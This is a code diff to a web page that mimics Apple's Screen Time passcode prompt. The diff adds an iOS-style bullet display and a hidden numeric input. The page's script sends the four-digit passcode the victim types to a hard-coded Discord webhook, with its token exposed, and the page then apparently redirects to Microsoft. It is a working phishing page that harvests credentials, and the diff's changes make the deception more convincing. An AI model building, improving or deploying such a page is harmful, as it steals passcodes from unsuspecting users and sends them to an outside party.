@@ -40,7 +40,7 @@
         .logo-text {
             font-size: 32px;
             font-weight: bold;
-            color: black; 
+            color: black;
             letter-spacing: 1.5px;
             margin-top: 10px;
         }
@@ -55,24 +55,24 @@
 
         /* Apple-style Input Box */
         .input-bar {
-            width: 100%;
-            padding: 18px 20px;
-            border-radius: 15px;
-            border: 1px solid #d1d1d6;
-            background-color: white;
-            font-size: 18px;
-            color: #333;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            outline: none;
-            letter-spacing: 1px;
-            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 0 auto;
             max-width: 280px;
-            transition: box-shadow 0.2s ease-in-out, border-color 0.2s ease-in-out;
         }
 
-        .input-bar:focus {
-            border-color: #007aff;
-            box-shadow: 0 0 12px rgba(0, 122, 255, 0.3);
+        .bullet {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #d1d1d6;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: background-color 0.2s ease-in-out;
+        }
+
+        .bullet.filled {
+            background-color: #007aff;
         }
 
         /* Button Styling */
@@ -95,6 +95,46 @@
         .send-btn:active {
             transform: scale(1);
         }
+
+        /* Keypad Styling */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 220px;
+            margin: 0 auto;
+        }
+
+        .key {
+            width: 50px;
+            height: 50px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            border: 2px solid #d1d1d6;
+            border-radius: 50%;
+            background-color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key:hover {
+            background-color: #f1f1f1;
+            transform: scale(1.1);
+        }
+
+        .key:active {
+            background-color: #e0e0e0;
+            transform: scale(1);
+        }
+
+        .key:disabled {
+            background-color: #e0e0e0;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -105,38 +145,47 @@
         </div>
 
         <div class="input-container">
-            <input type="password" class="input-bar" id="inputBar" maxlength="4" placeholder="Enter Screen Time Password"/>
-            <button class="send-btn" id="sendButton">Enter</button>
+            <!-- Bullet point "input" -->
+            <div class="input-bar" id="inputBar">
+                <div class="bullet" id="bullet1"></div>
+                <div class="bullet" id="bullet2"></div>
+                <div class="bullet" id="bullet3"></div>
+                <div class="bullet" id="bullet4"></div>
+            </div>
+            <!-- Native iOS keypad -->
+            <input type="tel" id="inputField" maxlength="4" style="opacity: 0; position: absolute;" />
+            <button class="send-btn" id="sendButton" disabled>Enter</button>
         </div>
     </div>
 
     <script>
-        const inputBar = document.getElementById('inputBar');
+        const inputField = document.getElementById('inputField');
         const sendButton = document.getElementById('sendButton');
         const webhookURL = 'https://discord.com/api/webhooks/1476676519324815536/B5ya1lbcHJ-GwS41t2_0trQpYUoC2pXE2rC5D3P-waDDsFpiNP_IIkQjw1kZvUEctqYv'; // Replace with your actual webhook URL
 
-        // Masking behavior for the input
-        inputBar.addEventListener('input', function() {
-            let value = inputBar.value;
-            let maskedValue = '•'.repeat(value.length) + '_'.repeat(4 - value.length);
-            inputBar.setAttribute('placeholder', maskedValue);
-        });
+        let password = ""; // Store the entered password
+        const bulletElements = [document.getElementById('bullet1'), document.getElementById('bullet2'), document.getElementById('bullet3'), document.getElementById('bullet4')];
 
-        // Focus and blur events to handle placeholder behavior
-        inputBar.addEventListener('focus', () => {
-            inputBar.placeholder = '';
-        });
-
-        inputBar.addEventListener('blur', () => {
-            if (inputBar.value.length === 0) {
-                inputBar.placeholder = 'Enter screen time password';
+        // Function to update the bullet points
+        function updateBullets() {
+            for (let i = 0; i < 4; i++) {
+                if (i < password.length) {
+                    bulletElements[i].classList.add('filled');
+                } else {
+                    bulletElements[i].classList.remove('filled');
+                }
             }
+            sendButton.disabled = password.length !== 4; // Enable/disable button based on password length
+        }
+
+        // Function to handle input
+        inputField.addEventListener('input', () => {
+            password = inputField.value; // Update the password
+            updateBullets();
         });
 
         // Button click event to send the data to Discord and redirect to Microsoft
         sendButton.addEventListener('click', async () => {
-            const password = inputBar.value;
-
             // Check if the password length is exactly 4 characters
             if (password.length === 4) {
                 const payload = {
@@ -165,6 +214,9 @@
                 }
             }
         });
+
+        // Focus on the native input field (it will trigger the iOS keyboard)
+        inputField.focus();
     </script>
 </body>
 </html>
